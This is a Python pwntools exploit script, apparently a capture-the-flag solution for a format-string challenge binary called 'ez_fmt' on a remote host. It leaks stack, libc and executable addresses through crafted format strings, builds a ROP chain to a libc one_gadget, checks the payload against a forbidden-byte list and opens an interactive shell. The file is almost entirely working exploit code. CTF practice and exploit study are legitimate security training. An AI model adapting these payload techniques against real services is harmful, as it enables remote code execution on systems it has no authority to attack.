#!/usr/bin/python3

from pwn import *

def CheckWhiteList(payload):
	print(payload)
	if (b'A' in payload):
		return -1
	if (b'E' in payload):
		return -1
	if (b'F' in payload):
		return -1
	if (b'G' in payload):
		return -1
	if (b'X' in payload):
		return -1
	if (b'a' in payload):
		return -1
	if (b'd' in payload):
		return -1
	if (b'e' in payload):
		return -1
	if (b'f' in payload):
		return -1
	if (b'g' in payload):
		return -1
	if (b'i' in payload):
		return -1
	if (b'o' in payload):
		return -1
	if (b'p' in payload):
		return -1
	if (b's' in payload):
		return -1
	if (b'u' in payload):
		return -1
	if (b'x' in payload):
		return -1
	return payload

libc = ELF('./libc.so.6', checksec=False)
context.binary = exe = ELF('./ez_fmt_patched', checksec=False)
context.log_level = 'info'
libc.sym['one_gadget'] = 0xe3afe

while True:
	while True:
		# p = process(exe.path)
		p = remote('192.81.209.60', 2022)
		p.recvuntil(b':##\n')

		payload = b'%*9$'
		p.sendline(payload)
		data = p.recvline(timeout=1)
		if not data:
			p.close()
			continue
		stack_leak = u32(struct.pack('<i', int(data[1:-1])))
		if ((stack_leak - 0x27) & 0xff) == 0:
			break
		p.close()

	###########################
	### Stage 1: Leak stack ###
	###########################
	payload = f'%{(stack_leak & 0xff00) - 5}c%9$hn'.encode()
	payload = payload.ljust(0x17, b'B')
	p.sendline(payload)
	
	payload = b'%c'*8
	payload += f'%{ord("p") - 8}c%n'.encode()
	payload += b'%10$'
	p.sendline(payload)

	p.recvuntil(b'0x')
	stack_leak = int(p.recv(12), 16)
	log.info("Stace leak: " + hex(stack_leak))
		
	##########################
	### Stage 2: Leak libc ###
	##########################
	payload = b'%c'*8
	payload += f'%{ord("p") - 8}c%n'.encode()
	payload += b'%19$'
	p.sendline(payload)

	p.recvuntil(b'0x')
	libc_leak = int(p.recv(12), 16)
	libc.address = libc_leak - 0x24083
	log.info("Libc leak: " + hex(libc_leak))
	log.info("Libc base" + hex(libc.address))

	#########################
	### Stage 3: Leak exe ###
	#########################
	payload = b'%c'*8
	payload += f'%{ord("p") - 8}c%n'.encode()
	payload += b'%11$'
	p.sendline(payload)

	p.recvuntil(b'0x')
	exe_leak = int(p.recv(12), 16)
	log.info("Exe leak: " + hex(exe_leak))
	exe.address = exe_leak - 0x13ad
	log.info("Exe base: " + hex(exe.address))

	#########################################
	### Stage 4: ROPchain with one_gadget ###
	#########################################
	add_rsp_x38 = exe.address + 0x00000000000012da
	pop_r12 = libc.address + 0x000000000002f709

	payload = f'%{add_rsp_x38 & 0xffff}c%8$hn'.encode()
	payload = payload.ljust(0x10, b'B')
	payload += p64(stack_leak - 0x23)
	payload = payload.ljust(0x50-0x18, b'B')
	payload += flat(
		pop_r12, 0,
		libc.sym['one_gadget']
		)
	if CheckWhiteList(payload)==-1:
		log.critical("In blacklist!")
		p.close()
		continue
	p.sendline(payload)

	p.interactive()
